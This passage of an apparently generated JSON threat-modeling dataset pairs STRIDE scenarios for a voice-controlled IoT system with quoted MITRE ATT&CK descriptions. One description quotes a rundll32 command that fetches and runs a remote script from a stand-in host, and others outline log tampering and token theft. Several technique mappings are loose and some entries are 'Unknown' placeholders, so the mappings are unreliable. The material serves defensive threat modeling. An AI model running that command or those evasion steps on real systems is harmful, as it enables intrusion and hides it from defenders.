                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
                "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
                "technique_id": "T1218.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains access to the server-side application and elevates privileges through a misconfigured setting.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application has misconfigurations.",
                    "Role": "System Administrator",
                    "Condition": "Configuration phase"
                },
                {
                    "Assumption": "The attacker can access the server or gain initial access through vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Attack execution phase"
                },
                {
                    "Assumption": "There are no adequate monitoring and detection mechanisms in place.",
                    "Role": "Security Architect",
                    "Condition": "Deployment phase"
                }
            ],
            "Potential Impact": "Potential unauthorized control over server operations and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "server access",
                "misconfiguration",
                "unauthorized control",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages an insecure cloud service configuration to gain higher privileges within the cloud environment.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service configurations are not securely managed.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Service configuration phase"
                },
                {
                    "Assumption": "The attacker identifies and exploits configuration weaknesses.",
                    "Role": "Attacker",
                    "Condition": "Vulnerability exploitation phase"
                },
                {
                    "Assumption": "There is no effective cloud security monitoring in place.",
                    "Role": "Cloud Security Engineer",
                    "Condition": "Operational phase"
                }
            ],
            "Potential Impact": "Potential unauthorized privileges within the cloud service and access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "cloud service",
                "configuration weakness",
                "privilege escalation",
                "cloud environment"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "14",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user to issue voice commands.",
            "Assumptions": [
                {
                    "Assumption": "Voice recognition does not effectively distinguish between the attacker and legitimate users.",
                    "Role": "Attacker",
                    "Condition": "Voice recognition technology is compromised or insufficiently trained."
                },
                {
                    "Assumption": "The attacker has access to the microphone.",
                    "Role": "Attacker",
                    "Condition": "Physical proximity to the device or compromised microphone hardware."
                },
                {
                    "Assumption": "No secondary authentication to verify user identity.",
                    "Role": "Developer",
                    "Condition": "Application lacks multi-factor authentication."
                }
            ],
            "Potential Impact": "Unauthorized actions or data access.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "voice command",
                "authentication bypass",
                "impersonation"
            ],
            "mitre_technique": {
                "name": "Token Impersonation/Theft",
                "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",
                "id": "attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d",
                "technique_id": "T1134.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sends fake server responses to the client-side application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept or modify communications between client and server.",
                    "Role": "Attacker",
                    "Condition": "Insufficient encryption or secure communication protocols."
                },
                {
                    "Assumption": "The client-side application lacks verification of server identity.",
                    "Role": "Developer",
                    "Condition": "No mutual authentication between client and server."
                },
                {
                    "Assumption": "The attacker has the capability to inject network traffic.",
                    "Role": "Attacker",
                    "Condition": "Compromised network environment or control of intermediate network devices."
                }
            ],
            "Potential Impact": "Misinformation to users or unauthorized control over IoT devices.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "network traffic injection",
                "communication hijack"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised IoT device to issue legitimate commands.",
            "Assumptions": [
                {
                    "Assumption": "The IoT device has been previously compromised.",
                    "Role": "Attacker",
                    "Condition": "The device lacked security updates or was installed in a vulnerable environment."
                },
                {
                    "Assumption": "The attacker has access to network credentials.",
                    "Role": "Attacker",
                    "Condition": "Weak network security or exposed credentials."
                },
                {
                    "Assumption": "There are no device-specific authentication mechanisms.",
                    "Role": "Developer",
                    "Condition": "Application relies solely on network-level security without individual device authentication."
                }
            ],
            "Potential Impact": "Unauthorized control over other IoT devices and potential physical actions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "IoT compromise",
                "network credentials",
                "unauthorized control"
            ],
            "mitre_technique": {
                "name": "User Execution",
                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the client-side application to alter voice commands before they reach the server.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the client-side application.",
                    "Role": "Attacker",
                    "Condition": "Physical access or exploitation of a software vulnerability."
                },
                {
                    "Assumption": "Lack of integrity checks on the client-side application.",
                    "Role": "Developer",
                    "Condition": "No code signing or tamper detection mechanisms."
                },
                {
                    "Assumption": "Users do not notice altered application behavior.",
                    "Role": "User",
                    "Condition": "Minimal user interaction or transparency in app operations."
                }
            ],
            "Potential Impact": "Compromised data integrity leading to incorrect server processing.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "client-side modification",
                "code injection",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Reflective Code Loading",
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
                "id": "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a",
                "technique_id": "T1620"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware on IoT devices to alter their behavior.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the firmware update process.",
                    "Role": "Attacker",
                    "Condition": "Lack of security controls over firmware updates."
                },
                {
                    "Assumption": "Firmware updates are not cryptographically signed.",
                    "Role": "Developer",
                    "Condition": "Updates are delivered over insecure channels."
                },
                {
                    "Assumption": "Users or administrators do not verify firmware integrity.",
                    "Role": "Administrator",
                    "Condition": "Automated or unchecked update processes."
                }
            ],
            "Potential Impact": "Altered device functionality causing incorrect responses or actions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware modification",
                "device compromise",
                "unauthorized update"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies the server\u2019s responses before they reach the client-side application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access network traffic between the server and client.",
                    "Role": "Attacker",
                    "Condition": "Compromised network infrastructure or control over network devices."
                },
                {
                    "Assumption": "Communications are not encrypted or authenticated.",
                    "Role": "Developer",
                    "Condition": "Lack of TLS or other secure communication protocols."
                },
                {
                    "Assumption": "Clients do not verify response integrity.",
                    "Role": "Developer",
                    "Condition": "Application does not validate response integrity."
                }
            ],
            "Potential Impact": "Invalid responses leading to incorrect user information or actions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "response modification",
                "network interception",
                "data integrity compromise"
            ],
            "mitre_technique": {
                "name": "Indicator Blocking",
                "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1086) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. ",
                "id": "attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df",
                "technique_id": "T1054"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having issued certain voice commands.",
            "Assumptions": [
                {
                    "Assumption": "No logging of voice commands with user identification.",
                    "Role": "Developer",
                    "Condition": "Lack of detailed audit trails or user activity logs."
                },
                {
                    "Assumption": "Shared devices without individual user profiles.",
                    "Role": "User",
                    "Condition": "Multiple users sharing the same device and voice profile."
                },
                {
                    "Assumption": "No mechanism to verify user identity reliably.",
                    "Role": "Developer",
                    "Condition": "Absence of secondary verification methods."
                }
            ],
            "Potential Impact": "Inability to resolve disputes or verify actions leading to mistrust.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit logs",
                "user verification",
                "activity denial"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An administrator denies having changed IoT device configurations.",
            "Assumptions": [
                {
                    "Assumption": "No logging of configuration changes with user IDs.",
                    "Role": "Developer",
                    "Condition": "Lack of detailed logs for administrative actions."
                },
                {
                    "Assumption": "Configuration changes can be made without authentication.",
                    "Role": "Developer",
                    "Condition": "No role-based access controls or multi-factor authentication."
                },
                {
                    "Assumption": "Inadequate tracking of configuration history.",
                    "Role": "Administrator",
                    "Condition": "No version control or history tracking for configuration files."
                }
            ],
            "Potential Impact": "Unresolved configuration issues and potential security vulnerabilities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "configuration changes",
                "administration logs",
                "access control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--10f6381a-5b74-48df-9fb7-a4c7c695e039",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having accessed sensitive data retrieved via voice commands.",
            "Assumptions": [
                {
                    "Assumption": "No detailed logging of data access events.",
                    "Role": "Developer",
                    "Condition": "Data access events are not thoroughly logged."
                },
                {
                    "Assumption": "No authentication required for sensitive data access.",
                    "Role": "Developer",
                    "Condition": "Sensitive data can be accessed based on voice command alone."
                },
                {
                    "Assumption": "Shared devices with common access credentials.",
                    "Role": "User",
                    "Condition": "Multiple users access the same device without individual credentials."
                }
            ],
            "Potential Impact": "Disputes over data access could lead to security breaches.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data access",
                "audit trails",
                "voice command"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts voice commands or responses during transmission.",
            "Assumptions": [
                {
                    "Assumption": "Insecure transmission of data between components.",
                    "Role": "Developer",
                    "Condition": "Use of unencrypted communication protocols."
                },
                {
                    "Assumption": "The attacker has access to the network.",
                    "Role": "Attacker",
                    "Condition": "Compromised network environment or sniffing capabilities."
                },
                {
                    "Assumption": "No encryption or secure communication setup.",
                    "Role": "Developer",
                    "Condition": "Lack of implementation of security measures for data transmission."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive voice data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "network sniffing",
                "unencrypted transmission"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored in the cloud is accessed by unauthorized users.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage lacks strong access controls.",
                    "Role": "Developer",
                    "Condition": "Insufficiently defined access rules or credentials management."
                },
                {
                    "Assumption": "Data is not encrypted at rest.",
                    "Role": "Developer",
                    "Condition": "Data stored without encryption mechanisms."
                },
                {
                    "Assumption": "Potential vulnerabilities in the cloud service.",
                    "Role": "Attacker",
                    "Condition": "Exploitable bugs or weak configurations in the cloud service provider's infrastructure."
                }
            ],
            "Potential Impact": "Exposure of sensitive stored information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud storage",
                "unauthorized access",
                "data encryption"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker eavesdrops on voice commands and responses via compromised microphone.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised the microphone hardware or software.",
                    "Role": "Attacker",
                    "Condition": "Physical access or malware capable of controlling the microphone."
                },
                {
                    "Assumption": "Microphone data is transmitted without encryption.",
                    "Role": "Developer",
                    "Condition": "Insecurely recorded audio streams."
                },
                {
                    "Assumption": "No monitoring or alerts for unusual microphone activity.",
                    "Role": "Developer",
                    "Condition": "Lack of mechanisms to detect compromise of the microphone component."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive voice interactions.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "eavesdropping",
                "microphone compromise",
                "audio interception"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends an overwhelming number of illegitimate voice commands to disrupt the system.",
            "Assumptions": [
                {
                    "Assumption": "No rate limiting or traffic management controls.",
                    "Role": "Developer",
                    "Condition": "Absence of mechanisms to control the rate of incoming commands."
                },
                {
                    "Assumption": "High capacity and no fail-safes in the voice processing system.",
                    "Role": "Developer",
                    "Condition": "System unable to distinguish and handle excessive inputs."
                },
                {
                    "Assumption": "The attacker can generate high-volume traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to automated tools or bots to generate traffic."
                }
            ],
            "Potential Impact": "Service disruption and reduced availability for legitimate users.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "voice command flood",
                "resource exhaustion",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the server-side application to crash it.",
            "Assumptions": [
                {
                    "Assumption": "Existing software vulnerabilities in the server-side application.",
                    "Role": "Developer",
                    "Condition": "Unpatched or improperly managed application code."
                },
                {
                    "Assumption": "The attacker can discover and exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Previous reconnaissance and testing of the server-side application."
                },
                {
